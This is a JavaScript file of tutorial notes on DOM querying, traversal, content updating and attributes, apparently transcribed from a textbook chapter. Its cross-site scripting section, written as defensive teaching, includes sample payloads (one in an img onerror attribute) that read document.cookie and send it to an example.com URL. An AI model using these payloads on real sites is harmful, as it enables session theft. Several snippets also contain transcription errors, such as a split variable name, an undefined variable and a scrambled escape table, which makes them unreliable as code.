   // querySelectorAll returns a NodeList
   // The 2nd matching element (the 3rd li) is selected and changed
   var els = document.querySelectorAll('li.hot');
   els[1].className = 'cool';
These two methods were introduced by browser manufacturers, because a lot of developers were including scripts like jQuery in their pages, so that they could
select elements using CSS selectors.
If you look at the final line of code, array syntax is used to select the second item from the NodeList, even though that NodeList is stored in a variable.
The drawback with these two methods is that they are only supported in more recent browsers:
	IE8+ (released Mar 2009)
	Firefox 3.5+ (released Jun 2009)
	Chrome 1+ (released Sep 2008)
	Opera 10+ (released Sep 2009)
	Safari 3.2+ (released Nov 2008)
JavaScript code runs one line at a time, and statements affect the content of a page as the interpreter processes them.
If a DOM query runs when a page loads, the same query could return different elements if it is used again later in the page:
	
	1: WHEN THE PAGE FIRST LOADS
	 HTML    c05/query-selector.html
	   <ul>
		 <li id="one" class="hot">
		   <em>fresh</em> figs</li>
		 <li id="two" class="hot">pine nuts</li>
		 <li id="three" class="hot">honey</li>
		 <li id="four">balsamic vinegar</li>
	   </ul>
	The page starts with three <li> elements that have a class attribute whose value is hot.
	The querySelector() method finds the first one, and updates the value of its class attribute from hot to cool.
	This also updates the DOM tree stored in memory, so after this line has run, only the second and third <li> elements have a class attribute	with a value of hot.

	2: AFTER THE FIRST SET OF STATEMENTS
	 HTML    c05/query-selector.html
	   <ul>
		 <li id="one" class="cool">
		   <em>fresh</em> figs</li>
		 <li id="two" class="hot">pine nuts</li>
		 <li id="three" class="hot">honey</li>
		 <li id="four">balsamic vinegar</li>
	   </ul>
	When the second selector runs, there are now only two <li> elements whose class attributes have a value of hot, so it just selects these two.
	This time, array syntax is used to work with the second of the matching	elements (which is the third list item).
	Again, the value of its class attribute is changed from hot to cool.

	3: AFTER THE SECOND SET OF STATEMENTS
	 HTML    c05/query-selector.html
	   <ul>
		 <li id="one" class="cool">
		   <em>fresh</em> figs</li>
		 <li id="two" class="hot">pine nuts</li>
		 <li id="three" class="cool">honey</li>
		 <li id="four">balsamic vinegar</li>
	   </ul>
	When the second selector has done its job, the DOM tree now only holds one <li> element whose class attribute has a value of hot.
	Any further code looking for <li> elements whose class attribute has a value of hot, would find only this one.
	However, if they were looking for <li> elements, whose class attribute has a value of cool, they would find two matching element nodes.
*/

/*
	REPEATING ACTIONS FOR AN ENTIRE NODELIST
	When you have a NodeList, you can loop through each node in the collection and apply the same statements to each.
	In this example, once a NodeList has been created, a for loop is used to go through each element in the NodeList.
	All of the statements inside the for loop's curly braces are applied to	each element in the NodeList one-by-one.
	To indicate which item of the NodeList is currently being worked with, the counter i is used in the array-style syntax:
		 var hotItems = document.querySelectorAll('li.hot');
		 for(var i = 0; i < hotItems.length; i++)
		 {
		   hotItems[i].className = 'cool';
		 }
	1. The variable hotItems contains a NodeList, with all list items whose class attribute has a value of hot, collected via the querySelectorAll() method.
	2. The length property of the NodeList indicates how many elements are in the NodeList, the number of elements dictates how many times the loop should run.
	3. Array syntax is used to indicate which item in the NodeList is currently being worked with: hotItems[i], using the counter, i, inside the square brackets.

	LOOPING THROUGH A NODELIST
	If you want to apply the same code to numerous elements, looping through a NodeList is a powerful technique.
	It involves finding out how many items are in the NodeList, and then setting a counter to loop through them, one-by-one.
	Each time the loop runs, the script checks that the counter is less than the total number of items in the NodeList.
	 JAVASCRIPT    c05/js/node-list.js
	   var hotItems = document.querySelectorAll('li.hot');
	   if(hotItems.length > 0)
	   {
		   for(var i = 0; i < hotItems.length; i++)
		   {
				hotItems[i].className = 'cool';
		   }  
	   }
	The NodeList is generated using querySelectorAll(), and it is looking for any <li> elements that have a class attribute whose value is hot.
	The NodeList is stored in a variable called hotItems, and the number of	elements in the list is found using the length property.
	For each of the elements in the NodeList, the value of the class attribute is changed to cool.
*/

/*
	LOOPING THROUGH A NODELIST: PLAY-BY-PLAY
	At the start of this example, there are three list items with a class attribute whose value is hot, so the value of hotItems.length is 3.
	At first, the value of the counter is set to 0, so the first item from the NodeList is targeted and the value of its class attribute is set to cool.
		for(var i = 0; i < hotItems.length; i++)
		{
			hotItems[i].className = 'cool';
		}
	When the value of the counter is 1, the second item from the NodeList is targeted and the value of its class attribute is set to cool.
	When the value of the counter is 2, the third item from the NodeList is targeted and the value of its class	attribute is set to cool.
	When the value of the counter is 3, the condition no longer returns	true, so the loops ends.
	The script then continues to the first line of code after the loop.
*/

/*
	TRAVERSING THE DOM
	When you have an element node, you can select another element in relation to it using these five properties, known as traversing the DOM:
	1. parentNode (li(0) -> ul)
	This property finds the element node for the parent element in the HTML.
	If you started with the first <li> element, then its parent node would be the one representing the <ul> element.

	2 & 3. previousSibling/nextSibling (li(0) -> li(1))
	These properties find the previous or next sibling of a node if there are siblings.
	If you started with the first <li> element, it would not have a previous sibling, but its next sibling would be the node representing the second <li>.

	4 & 5. firstChild/lastChild (ul -> li(3))
	These properties find the first or last child of the current element.
	If you started with the <ul> element, the first child would be the node representing the first <li> element, and the last child would be the last <li>.

	These are properties of the current node (not methods to select an element); therefore, they do not end in parentheses.
	If you use these properties and they do not have a previous/next sibling, or a first/last child, the result will be null.
	These properties are read-only; they can only be used to select a new node, not to update a parent, sibling, or child.
*/

/*
	WHITESPACE NODES
	Traversing the DOM can be difficult because some browsers add a text node whenever they come across whitespace between elements.
	Most browsers, except IE, treat whitespace between elements (such as spaces or carriage returns) as a text node, so the properties below return different
	elements in different browsers:
		previousSibling
		nextSibling
		firstChild
		lastChild
	You could strip all the whitespace out of a page before serving it to the browser.
	This would also make the page smaller and faster to serve/load, but it would also make the code much harder to read.
	Another way around this problem is to avoid using these DOM properties altogether.
	One of the most popular ways to address this kind of problem is to use a JavaScript library such as jQuery, which helps deal with such problems.
	These types of browser inconsistencies were a big factor in jQuery's popularity.
*/

/*
	PREVIOUS & NEXT SIBLING
	For this example, all spaces between the HTML elements have been removed.
	In order to demonstrate these properties, the second list item is selected using getElementById().
	From this element node, the previousSibling property will return the first <li> element, and the nextSibling property will return the third	<li> element.
		HTML    c05/sibling.html
	   <ul>
		<li id="one" class="hot"><em>fresh</em>figs</li>
		<li id="two" class="hot">pine nuts</li>
		<li id="three" class="hot">honey</li>
		<li id="four">balsamic vinegar</li>
	   </ul>
	  JAVASCRIPT    c05/js/sibling.js
	   // Select the starting point and find its siblings
	   var startItem = document.getElementById('two');
	   var prevItem = startItem.previousSibling;
	   var nextItem = startItem.nextSibling;
	   // Change the values of the siblings' class attributes
	   prevItem.className = 'complete';
	   nextItem.className = 'cool';
	   // li(0) <= li(1) => li(2)
	Note how references to sibling nodes are stored in new variables.
	This means properties such as className can be used on that node by	adding the dot notation between the variable name and the property.
*/

/*
	FIRST & LAST CHILD
	In this example, a slightly different solution is used in HTML: the closing tags are next to the opening tags of the next element, making it a little more
	readable.
	The example starts by using the getElementsByTagName() method to select the <ul> element from the page.
	From this element node, the firstChild property will return the first <li> element, and the lastChild property will return the last <li> element.
		HTML    c05/child.html
		<ul>
			<li id="one" class="hot"><em>fresh</em>! figs</li>
			<li id="two" class="hot">pine nuts</li>
			<li id="three" class="hot">honey</li>
			<li id="four">balsamic vinegar</li>
		</ul>
		JAVASCRIPT    c05/js/child.js
		   // Select the starting point and find its children
		   var startItem = document.getElementsByTagName('ul')[0];
		   var firstItem = startItem.firstChild;
		   var lastItem = startItem.lastChild;
		   // Change the values of the children's class attributes
		   firstItem.setAttribute('class', 'complete');
		   lastItem.setAttribute('class', 'cool');
*/

/*
	HOW TO GET/UPDATE ELEMENT CONTENT
	So far, this chapter has focused on finding elements in the DOM tree, the rest of this chapter shows how to access/update element content.
	Your choice of techniques depends upon what the element contains.
	Take a look at the three examples of <li> elements.
	Each one adds some more markup and, as a result, the fragment of the DOM tree for each list item is very different:
		1. The first <li> just contains text.
		2. The second and third <li> contain a mix of text and an <em> element.
	You can see that by adding something as simple as an <em> element, the DOM tree's structure changes significantly.
	In turn, this affects how you might work with that list item.
	When an element contains a mix of text and other elements, you are more	likely to work with the containing element rather than the individual nodes for each
	descendant.
		<li id="one">figs</li>

		li -> attribute
		|
		text:
		figs
	Above, the <li> element has:
		1. One child node holding the word that you can see in the list item: figs.
		2. An attribute node holding the id attribute.
	To work with the content of elements you can:
		Navigate to the text nodes, this works best when the element contains only text, no other elements.
		Work with the containing element, this allows you to access its text nodes and child elements, best when they are siblings.
*/

/*
	TEXT NODES
	Once you have navigated from an element to its text node, there is one property that you will commonly find yourself using:
		PROPERTY: nodeValue
		DESCRIPTION: accesses text from node
		<li id="one"><em>fresh</em>figs</li>

				li -> attribute
				|
		  em   - - text:
		   |	   figs
		 text:
		 fresh
	An <em> element is added, and it becomes the first child.
	The <em> element node has its own child text node, which contains the word fresh.
	The original text node is now a sibling of the node that represents the <em> element.

		<li id="one">six<em>fresh</em>figs</li>

				li -> attribute
				|
		 text: - -	text:
		   six	|   figs
			   em
				|
			  text:
			  fresh
	When text is added before the <em> element:
		The first child of the <li> element is a text node, which contains the word six.
		It has a sibling which is an element node for the <em> element.
		In turn, that <em> element node has a child text node containing the word fresh.
		Finally, there is a text node holding the word figs, which is a sibling of both the text node for the word "six" and the element node, <em>.
*/

/*
	CONTAINING ELEMENT
	When you are working with an element node (rather than its text node), that element can contain markup.
	You have to choose whether you want to retrieve (get) or update (set) the markup as well as the text:
		PROPERTY		DESCRIPTION
		innerHTML		Gets/sets text & markup
		textContent		Gets/sets text only
		innerText		Gets/sets text only
	When you use these properties to update the content of an element, the new content will overwrite the entire contents of the element (both text	and markup).
	For example, if you used any of these properties to update the content of the <body> element, it would update the entire web page.
*/

/*
	ACCESS & UPDATE A TEXT NODE WITH NODEVALUE
	When you select a text node, you can retrieve or amend the content of it using the nodeValue property:
		<li id="one"><em>fresh</em> figs</li>
					li -> attribute
					|
			  em   - - text:
			   |	   figs
			 text:
			 fresh
	The code below shows how you access the second text node, that will return the result: figs.
		document.getElementById('one').firstChild.nextSibling.nodeValue;
	In order to use nodeValue, you must be on a text node, not the element that contains the text.
	This example shows that navigating from the element node to a text node	can be complicated.
	If you do not know whether there will be element nodes alongside text nodes, it is easier to work with the containing element:
		1. The <li> element node is selected using the getElementById() method.
		2. The first child of <li> is the <em> element.
		3. The text node is the next sibling of that <em> element.
		4. You have the text node and can access its contents using nodeValue.
*/

/*
	ACCESSING & CHANGING A TEXT NODE
	To work with text in an element, first the element node is accessed and then its text node.
	The text node has a property called nodeValue which returns the text in that text node, and can update the content of a text node:
		JAVASCRIPT    c05/js/node-value.js
		var itemTwo = document.getElementById('two');	// Get second list item
		var elText  = itemTwo.firstChild.nodeValue;		// Get its text content el
		Text = elText.replace('pine nuts', 'kale');		// Change pine nuts to kale
		itemTwo.firstChild.nodeValue = elText;			// Update the list item
	This example takes the text content of the second list item and changes	it from pine nuts to kale.
	The first line collects the second list item, it is then stored in a variable called itemTwo.
	Next, the text content of that element is stored in a variable called elText.
	The third line of text replaces the words 'pine nuts' with 'kale' using	the string object's replace() method.
	The last line uses the nodeValue property to update the content of the text node with the updated value.
*/

/*
	ACCESS & UPDATE TEXT WITH TEXTCONTENT (& INNERTEXT)
	The textContent property allows you to collect or update just the text that is in the containing element (and its children).
	To collect the text from the <li> elements (and ignore any markup inside the element), you can use the textContent property on the containing <li> element.
	In this case it would return the value: fresh figs.
	You can also use this property to update the content of the element; it replaces the entire content of it (including any markup):
		<li id="one"><em>fresh</em> figs</li>
				li -> attribute
				|
		  em   - - text:
		   |	   figs
		 text:
		 fresh
		document.getElementById('one').textContent;
	One issue with the textContent property is that Internet Explorer did not support it until IE9 (all other major browsers support it).

	You may also come across a property called innerText, but you should generally avoid it for three key reasons:
		1. SUPPORT
			Although most browser manufacturers adopted the property, Firefox does not, because innerText is not part of any standard.
		2. OBEYS CSS
			It will not show any content that has been hidden by CSS, so if there were a CSS rule that hid the <em> elements, the innerText property would return
			only the word figs.
		3. PERFORMANCE
			Because the innerText property takes into account layout rules that specify whether the element is visible or not, it can be slower to retrieve the
			content than the textContent property.
*/

/*
	ACCESSING TEXT ONLY
	In order to demonstrate the difference between textContent and innerText, this example features a CSS rule to hide the contents of the <em>	element.
	The script starts off by getting the content of the first list item, using both the textContent property and innerText, then writes the values after the list.
	Finally, the value of the first list item is then updated to say sourdough bread, this is done using the textContent property:
		JAVASCRIPT    c05/js/inner-text-and-text-content.js
		var firstItem = document.getElementById('one'); // find first list item
		var showTextContent = firstItem.textContent;    // get value of textContent
		var showInnerText = firstItem.innerText;        // get value of innerText
		// Show the content of these two properties at the end of the list
		var msg = ' <p>textContent: ' + showTextContent + '</p>';
			msg += '<p>innerText: ' + showInnerText + '</p>';
		var el = document.getElementById('scriptResults');
		el.innerHTML = msg;
		firstItem.textContent = 'sourdough bread'; // Update the first list item
	In most browsers, textContent collects the words 'fresh figs', innerHTML just shows figs (because fresh was hidden by the CSS).
	But in IE8 or earlier, the textContent property does not work.
	In Firefox, the innerText property will return undefined because it	was never implemented in Firefox.
*/

/*
	ADDING OR REMOVING HTML CONTENT
	There are two very different approaches to adding and removing content from a DOM tree:
		1. innerHTML property
		2. DOM manipulation.

		THE innerHTML PROPERTY
		APPROACH
		innerHTML can be used on any element node, both to retrieve and replace content.
		To update an element, new content is provided as a string, and it can contain markup for descendant elements.
		ADDING CONTENT
		Store new content (including markup) as a string in a variable.
		Select the element whose content you want to replace.
		Set the element's innerHTML property to be the new string.
		REMOVING CONTENT
		You set innerHTML to an empty string.
		To remove one element from a DOM fragment, e.g., one <li> from a <ul>, you need to provide the entire fragment minus that element.
		EXAMPLE: CHANGING A LIST ITEM
		1. Create variable holding markup:
				var item;
				item = '<em>Fresh</em> figs';
		You can have as much or as little markup in the variable as you want, it is a quick way to add a lot of markup to the DOM tree.
		2. Select element whose content you want to update:
					ul
					|
			   ----- -----
			   |	|    |
			   li	li	 li
			   |    |    |
			  text text text:
						 figs
		3. Update content of selected element with new markup:
					ul
					|
			   ----- ---------
			   |	|		 |
			   li	li		 li
			   |    |	  ---|-----
			  text text	  em	text:
						   | 	figs
						  text:
						  fresh
		DOM manipulation easily targets individual nodes in the DOM tree, whereas innerHTML is better suited to updating entire fragments.

		DOM MANIPULATION METHODS
		DOM manipulation can be safer than using innerHTML, but it requires more code and can be slower.
		APPROACH
		DOM manipulation refers to a set of DOM methods that allow you to create element and text nodes, and then attach/remove them from the DOM tree.
		ADDING CONTENT
		To add content, you use a DOM method to create new content one node at a time and store it in a variable.
		Then another DOM method is used to attach it to the right place in the DOM tree.
		REMOVING CONTENT
		You can remove an element (along with any contents and child elements it may contain) from the DOM tree using a single method.
		EXAMPLE: ADDING A LIST ITEM
		1. Create new text node:
				text
		2. Create new element node:
				li
		3. Add text node to element node:
				li
				|
				text
		4. Select element you want to add the new fragment to:
					ul
					|
			   ----- -----
			   |	|    |
			   li	li	 @
			   |    |    
			  text text 
		5. Append the new fragment to the selected element:
					ul
					|
			   ----- -----
			   |	|    |
			   li	li	 li
			   |    |    |
			  text text text
*/

/*
	ACCESS & UPDATE TEXT & MARKUP WITH INNERHTML
	Using the innerHTML property, you can access and amend the contents of an element, including any child elements.
	When getting HTML from an element, the innerHTML property will get the content of an element and return it as one long string, including any markup that the
	element contains.
	When used to set new content for an element, it takes a string that can contain markup and process that string, adding any elements within it to the DOM tree.
	When adding new content using innerHTML, be aware that one missing closing tag could throw out the design of the entire page.
	Even worse, if innerHTML is used to add content that your users created to a page, they could add malicious content!
		<li id="one"><em>fresh</em> figs</li>
				li -> attribute
				|
		  em   - - text:
		   |	   figs
		 text:
		 fresh
*/

/*
	GET CONTENT
	The following line of code collects the content of the list item and adds it to a variable called elContent:
		var elContent = document.getElementById('one').innerHTML;
		The elContent variable would now hold the string:
			'<em>fresh</em> figs'

	SET CONTENT
	The following line of code adds the content of the elContent variable (including any markup) to the first list item:
		document.getElementById('one').innerHTML = elContent;

	UPDATE TEXT & MARKUP
	This example starts by storing the first list item in a variable called firstItem.
	It then retrieves the content of this list item and stores it in a variable called itemContent.
	Finally, the content of the list item is placed inside a link, note how the quotes are escaped.
		 JAVASCRIPT    c05/js/inner-html.js
		var firstItem = document.getElementById('one');											// Store the first list item in a variable
		var itemContent = firstItem.innerHTML;													// Get the content of the first list item
		firstItem.innerHTML = '<a href=\"http://example.org\">'	+ itemContent + '</a>';			// Update the content of the first list item so it is a link
	As the content of the string is added to the element using the innerHTML property, the browser will add any elements in the string to the DOM.
	In this example, an <a> element has been added to the page (any new elements will also be available to other scripts in the page).
	If you use attributes in your HTML code, escaping the quotation using the escape key \ can make it clearer that those characters are not part of the script.
*/

/*
	ADDING ELEMENTS USING DOM MANIPULATION
	DOM manipulation offers another technique to add new content to a page (rather than innerHTML), it involves three steps:
		1. CREATE THE ELEMENT: createElement()
		You start by creating a new element node using the createElement() method, and this element node is stored in a variable.
		When the element node is created, it is not yet part of the DOM tree, it is not added to the DOM tree until step 3.
		2. GIVE IT CONTENT:	createTextNode()
		createTextNode() creates a new text node, and the node is stored in a variable.
		It can be added to the element node using the appendChild() method, this provides the content for the element.
		3. ADD IT TO THE DOM: appendChild()
		Now that you have your element, you can add it to the DOM tree using the appendChild() method.
		The appendChild() method allows you to specify which element you want this node added to, as a child of it.
	The insertBefore() method is used to add a new element before the selected DOM node.
*/

/*
	ADDING AN ELEMENT TO THE DOM TREE
	createElement() creates an element that can be added to the DOM tree, in this case, an empty <li> element for the list.
	This new element is stored inside a variable called newEl, until it is attached to the DOM tree later.
	createTextNode() allows you to create a new text node to attach to an element, it is stored in a variable called newText:
		JAVASCRIPT    c05/js/add-element.js
		var newEl = document.createElement('li');				// Create a new element and store it in a variable.
		var newText = document.createTextNode('quinoa');		// Create a text node and store it in a variable.
		newEl.appendChild(newText);								// Attach the new text node to the new element.
		var position = document.getElementsByTagName('ul')[0];  // Find the position where the new element should be added.
		position.appendChild(newEl);							// Insert the new element into its position.
	The text node is added to the new element node using appendChild().
	The getElementsByTagName() method selects the position in the DOM tree to insert the new element (the first <ul> element in the page).
	Finally, appendChild() is used again, this time to insert the new element and its content into the DOM tree.
*/

/*
	REMOVING ELEMENTS VIA DOM MANIPULATION
	DOM manipulation can be used to remove elements from the DOM tree.
		1. STORE THE ELEMENT TO BE REMOVED IN A VARIABLE
		You start by selecting the element that is going to be removed and store that element node in a variable.
		You can use any of the methods you saw in the section on DOM queries to	select the element.
		2. STORE THE PARENT OF THAT ELEMENT IN A VARIABLE
		Next, you find the parent element that contains the element you want to	remove and store that element node in a variable.
		The simplest way to get this element is to use the parentNode property of this element.
		3. REMOVE THE ELEMENT FROM ITS CONTAINING ELEMENT
		The removeChild() method is used on the containing element that you	selected in step 2.
		The removeChild() method takes one parameter: the reference to the element that you no longer want.
	When you remove an element from the DOM, it will also remove any child elements, this technique can significantly alter the DOM tree.
	Removing elements from the DOM will affect the index number of siblings	in a NodeList.
*/

/*
	REMOVING AN ELEMENT FROM THE DOM TREE
	This example uses the removeChild() method to remove the fourth item from the list (along with its contents).
	The first variable, removeEl, stores the actual element you want to	remove from the page (the fourth list item).
	The second variable, containerEl, stores the <ul> element that contains	the element you want to remove:
		JAVASCRIPT    c05/js/remove-element.js
		var removeEl = document.getElementsByTagName('li')[3]; // The element to remove
		var containerEl = removeEl.parentNode; // Its containing element
		containerEl.removeChild(removeEl); // Removing the element
	The removeChild() method is used on the variable that holds the container node.
	It requires one parameter: the element you want to remove (which is stored in the second variable).
				  ul				// Container Element
				   |
		   -----------------
		   |	|    |	   |
		   li	li	 li	   li*		// * Element to be Removed
*/

/*
	COMPARING TECHNIQUES: UPDATING HTML CONTENT
	So far, you have seen three techniques for adding HTML to a web page, it's time to compare when you should use each one.
	In any programming language, there are often several ways to achieve the same task.
	In fact, if you asked ten programmers to write the same script, you may	well find ten different approaches.
	Some programmers can be rather opinionated and believe that their way is always the "right" way to do things, when there are often several right ways.
	If you understand why people prefer some approaches over others, then you are in a strong position to decide whether it meets the needs of your project.
	1: document.write()
	The document object's write() method is a simple way to add content that was not in the original source code to the page, but its use is rarely	advised:
		ADVANTAGES
		It is a quick and easy way to show beginners how content can be added to a page.
		DISADVANTAGES
		It only works when the page initially loads, if you use it after the page has loaded, it can:
			1. Overwrite the whole page
			2. Not add the content to the page
			3. Create a new page
		It can cause problems with XHTML pages that are strictly validated.
		This method is very rarely used by programmers these days and is generally frowned upon.
	2: element.innerHTML
	The innerHTML property lets you get/update the entire content of any element (including markup) as a string.
		ADVANTAGES
		1. You can use it to add a lot of new markup using less code than DOM manipulation methods.
		2. It can be faster than DOM manipulation when adding a lot of new elements to a web page.
		3. It is a simple way to remove all of the content from one element (by assigning it a blank string).
		DISADVANTAGES
		1. It should not be used to add content that has come from a user (such as a username or blog comment), as it can pose a significant security risk which is
		   discussed over the next four pages.
		2. It can be difficult to isolate single elements that you want to update within a larger DOM fragment.
		3. Event handlers may no longer work as intended.
*/

/*
	DOM MANIPULATION
	DOM manipulation refers to using a set of methods and properties to access, create, and update elements and text nodes.
		ADVANTAGES
		1. It is suited to changing one element from a DOM fragment where there are many siblings.
		2. It does not affect event handlers.
		3. It easily allows a script to add elements incrementally (when you do	not want to alter a lot of code at once).
		DISADVANTAGES
		1. If you have to make a lot of changes to the content of a page, it is slower than innerHTML.
		2. You need to write more code to achieve the same thing compared with innerHTML.
*/

/*
	CROSS-SITE SCRIPTING (XSS) ATTACKS
	If you add HTML to a page using innerHTML (or several jQuery methods), you need to be aware of Cross-Site Scripting Attacks, or XSS; otherwise, an attacker
	could gain access to your users' accounts.
	XSS involves an attacker placing malicious code into a site.
	Websites often feature content created by many different people, for example:
		1. Users can create profiles or add comments.
		2. Multiple authors may contribute articles.
		3. Data can come from third-party sites such as Facebook, Twitter, news tickers, and other feeds.
		4. Files such as images and videos may be uploaded.
	Data you do not have complete control over is known as untrusted data; and it must be handled with care.

	WHAT CAN THESE XSS ATTACKS DO?
	XSS can give the attacker access to information in:
		1. The DOM (including form data)
		2. That website's cookies
		3. Session tokens: information that identifies you from other users when you log into a site.
	This could let the attacker access a user account and:
		1. Make purchases with that account
		2. Post defamatory content
		3. Spread their malicious code further/faster

	EVEN SIMPLE CODE CAN CAUSE PROBLEMS:
	Malicious code often mixes HTML and JavaScript (although URLs and CSS can be used to trigger XSS attacks).
	The two examples below demonstrate how fairly simple code could help an	attacker access a user's account.
	This first example stores cookie data in a variable, which could then be sent to a third-party server:
		<script>
			var adr = http://example.com/xss.php?cookie=' + escape(document.cookie);
		</script>
	This code shows how a missing image can be used with an HTML attribute to trigger malicious code:
		<img src="http://nofile" onerror="adr='http://example.com/xss.php?' + escape(document.cookie)"; />
	Any HTML from untrusted sources opens your site to XSS attacks, but the threat is only from certain characters.

	DEFENDING AGAINST CROSS-SITE SCRIPTING (XSS)
		VALIDATE INPUT GOING TO THE SERVER
		1. Only let visitors input the kind of characters they need to when supplying information, this is known as validation.
		   Do not allow untrusted users to submit HTML markup or JavaScript.
		2. Double-check validation on the server before displaying user content/storing it in a database.
		   This is important, because users could bypass validation in the browser by turning JavaScript off.
		3. The database may safely contain markup and script from trusted sources (your content management system).
		   This is because it does not try to process the code; it just stores it.

		ESCAPE DATA COMING FROM THE SERVER & DATABASE
		4. As your data leaves the database, all potentially dangerous characters should be escaped.
		5. Make sure that you are only inserting content generated by users into certain parts of the template files.
		6. Do not create DOM fragments containing HTML from untrusted sources, it should only be added as text once it has been escaped.
	So, you can safely use innerHTML to add markup to a page if you have written the code - but content from any untrusted sources should be escaped and added as
	text (not markup), using properties like textContent.

	XSS: VALIDATION & TEMPLATES
	Make sure that your users can only input characters they need to use and limit where this content will be shown on the page.
		FILTER OR VALIDATE INPUT
		1. The most basic defense is to prevent users from entering characters into form fields they do not need to use when providing that kind of information.
		2. For example, users' names and email addresses will not contain angled brackets, ampersands, or parentheses, so you can validate data to prevent
		   characters like this being used.
		3. This can be done in the browser, but must also be done on the server (in case the user has JavaScript turned off).

		LIMIT WHERE USER CONTENT GOES
		1. Malicious users will not just use <script></script> tags to try and create an XSS attack.
		Malicious code can live in an event handler attribute without being wrapped in <script> tags.
		XSS can also be triggered by malicious code in CSS or URLs.
		2. Browsers process HTML, CSS, and JavaScript in different ways (or execution contexts), and in each language, different characters can cause problems.
		   You should only add content from untrusted sources as text (not markup), and place that text in elements that are visible in the viewport.
	You may have seen that the comment sections on websites rarely allow you to enter a lot of markup (they sometimes allow a limited subset of HTML).
	This is to prevent people from entering malicious code such as <script></script> tags, or any other character with an event handling attribute.
	Even the HTML editors used in many content management systems will limit the code that you are allowed to use within them, and will automatically try to
	correct any markup that looks malicious.
	Never place any user's content in the following places without detailed experience of the issues involved:
		Script tags:
			<script>not here</script>
		HTML comments:
			<!-- not here -->
		Tag names:
			<notHere href="/test" />
		Attributes:
			<div notHere="norHere" />
		CSS values:
			{color: not here}

	XSS: ESCAPING & CONTROLLING MARKUP
	Any content generated by users that contain characters used in code should be escaped on the server, you must control any markup added to the page.
		ESCAPING USER CONTENT
		All data from untrusted sources should be escaped on the server before it is shown on the page.
		Most server-side languages offer helper functions that will strip-out or escape malicious code.
		HTML
		Escape these characters so that they are displayed as characters (not processed as code):
			&     &amp; '     &#x27; (not &apos;)
			<     &lt;"      &quot;
			>     &gt; /     &#x2F;
			-     &#x60;
		JAVASCRIPT
		Never include data from untrusted sources in JavaScript.
		It involves escaping all ASCII characters with a value less than 256 that are not alphanumeric characters (and can be a security risk).
		URLS
		If you have links containing user input (links to a user profile or search queries), use the JavaScript encodeURIComponent() method to encode the user
		input, it encodes the following characters:
				, / ? : @ & = + $ #
		
		ADDING USER CONTENT
		When you add untrusted content to an HTML page, once it has been escaped on the server, it should still be added to the page as text.
		JavaScript and jQuery both offer tools for doing this:
		JAVASCRIPT
			DO use: textContent or innerText
			DO NOT use: innerHTML
		JQUERY
			DO use: .text()
			DO NOT use: .html()
		You can still use the innerHTML property and jQuery .html() method to add HTML to the DOM, but you must ensure that:
			1. You control all of the markup being generated (do not allow user content that could contain markup).
			2. The user's content is escaped and added as text using the approaches noted above, rather than adding the user's content as HTML.
*/

/*
	ATTRIBUTE NODES
	Once you have an element node, you can use other properties and methods	on that element node to access and change its attributes.
	There are two steps to accessing and updating attributes:
		1: Select the element node that carries the attribute and follow it with a period symbol.
		2: Use one of the methods or properties below to work with that element's attributes.
			object.method(parameter);
	DOM QUERY.METHOD
		document.getElementById('one').getAttribute('class');
			document (Object):
				document refers to the document object, you always have to access individual elements via the document object.
			. (Member Operator):
				The dot notation indicates that the subsequent method will be used on the node specified to the left.
			getElementById('one') (Method):
				The getElementById() method indicates that you want to find an element based upon the value of its id attribute.
			('one') (Parameter):
				The method needs to know the value of the id attribute on the element you want, it is the parameter of the method.
			getAttribute('class') (Method):
				Gets the value of the attribute that was given as a	parameter of the method.
			METHOD							PROPERTY
		getAttribute()			gets the value of an attribute
		hasAttribute()			checks if element node has a specified attribute
		setAttribute()			sets the value of an attribute
		removeAttribute()		removes an attribute from an element node

			PROPERTY					   DESCRIPTION
		className				gets or sets the value of the class attribute
		id						gets or sets the value of the id attribute
	You have seen that the DOM treats each HTML element as its own object in the DOM tree.
	The properties of the object correspond to the attributes that type of element can carry.
*/

/*
	CHECK FOR AN ATTRIBUTE AND GET ITS VALUES
Before you work with an attribute, it is good practice to check whether it exists, this will save resources if the attribute cannot be found.
The hasAttribute() method of any element node lets you check if an attribute exists, the attribute name is given as an argument in the parentheses.
Using hasAttribute() in an if statement like this means that the code inside the curly braces will run only if the attribute exists on the given element:
	JAVASCRIPT    c05/js/get-attribute.js
	var firstItem = document.getElementById('one');
	if(firstItem.hasAttribute('class'))
	{                 
		var attr = firstItem.getAttribute('class');
		var el = document.getElementById('scriptResults');
		el.innerHTML = '<p>The first item has a class name: ' + attr + '</p>';
	}
In this example, the DOM query getElementById() returns the element whose id attribute has a value of one.
The hasAttribute() method is used to check whether this element has a class attribute, and returns a Boolean.
This is used with an if statement so that the code in the curly braces will run only if the class attribute does exist.
The getAttribute() method returns the value of the class attribute, which is then written to the page.
Both of these methods have good support in all major web browsers.
*/

/*
	CREATING ATTRIBUTES & CHANGING THEIR VALUES
The className property allows you to change the value of the class attribute.
If the attribute does not exist, it will be created and given the specified value.
The setAttribute() method allows you to update the value of any attribute.
It takes two parameters: the attribute name, and the value for the attribute:
	JAVASCRIPT    c05/js/set-attribute.js
	var firstItem = document.getElementById('one');
	firstItem.className = 'complete';
	var fourthItem = document.getElementsByTagName('li').item(3);
	el2.setAttribute('class', 'cool');
When there is a property (like the className or id properties), it is generally considered better to update the properties rather than use a method (because,
behind the scenes, the method would just be setting the properties anyway).
When you update the value of a class attribute, it can be used to trigger new CSS rules, and therefore change the appearance of the elements.
These techniques override the entire value of the class attribute, they do not add a new value to the existing value of the class attribute.
If you wanted to add a new value onto the existing value of the class attribute, you would need to read the content of the attribute first, then add the new text
to that existing value of the attribute (or use the jQuery .addClass() method).
*/

/*
	REMOVING ATTRIBUTES
To remove an attribute from an element, first select the element, then call removeAttribute().
It has one parameter: the name of the attribute to remove.
Trying to remove an attribute that does not exist will not cause an error, but it is good practice to check for its existence before attempting to remove it.
In this example, the getElementById() method is used to retrieve the first item from this list, which has an id attribute with a value of one:
	 JAVASCRIPT    c05/js/node-value.js
	var firstItem = document.getElementById('one');
	if (firstItem.hasAttribute('class'))
	{         
		firstItem.removeAttribute('class');
	}
The script checks to see if the selected element has a class attribute and, if so, it is removed.
*/

/*
	EXAMINING THE DOM IN CHROME
Modern browsers come with tools that help you inspect the page loaded in the browser and understand the structure of the DOM tree.
The <li> element is highlighted and the Properties panel indicates that this is an:
	li element, with an id attribute whose value is one and class whose	value is hot.
	an HTMLLIElement
	an HTMLElement
	an element
	a node
	an object
Each of these object names has an arrow next to it which you can use to expand that section.
It will tell you what properties are available to that kind of node.
They are separated because some properties are specific to list item elements, others to element nodes, others to all nodes, and others to all objects, and the
different properties are listed under the corresponding type of node.
